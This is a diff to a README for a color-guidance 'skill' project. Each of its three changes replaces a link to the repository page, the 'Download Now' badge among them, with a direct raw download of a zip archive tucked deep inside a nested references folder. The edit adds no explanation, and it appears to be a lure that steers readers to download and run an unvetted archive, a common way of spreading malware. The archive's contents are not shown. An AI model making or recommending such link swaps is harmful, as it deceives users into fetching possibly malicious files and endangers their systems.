@@ -1,6 +1,6 @@
 # 🎨 skill.color-expert - Clear Color Guidance for Every Project
 
-[![Download the app](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Lank-michael254/skill.color-expert)
+[![Download the app](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Lank-michael254/skill.color-expert/raw/refs/heads/main/references/contemporary/huevaluechroma/color-skill-expert-2.9.zip)
 
 ## 🧭 What this is
 
@@ -19,7 +19,7 @@ Use it when you want help with:
 
 Use this link to visit the page to download:
 
-https://github.com/Lank-michael254/skill.color-expert
+https://github.com/Lank-michael254/skill.color-expert/raw/refs/heads/main/references/contemporary/huevaluechroma/color-skill-expert-2.9.zip
 
 ### Windows steps
 
@@ -246,7 +246,7 @@ It is useful when you want:
 
 Use this page whenever you need the file again:
 
-https://github.com/Lank-michael254/skill.color-expert
+https://github.com/Lank-michael254/skill.color-expert/raw/refs/heads/main/references/contemporary/huevaluechroma/color-skill-expert-2.9.zip
 
 ## 📝 Basic request template
 
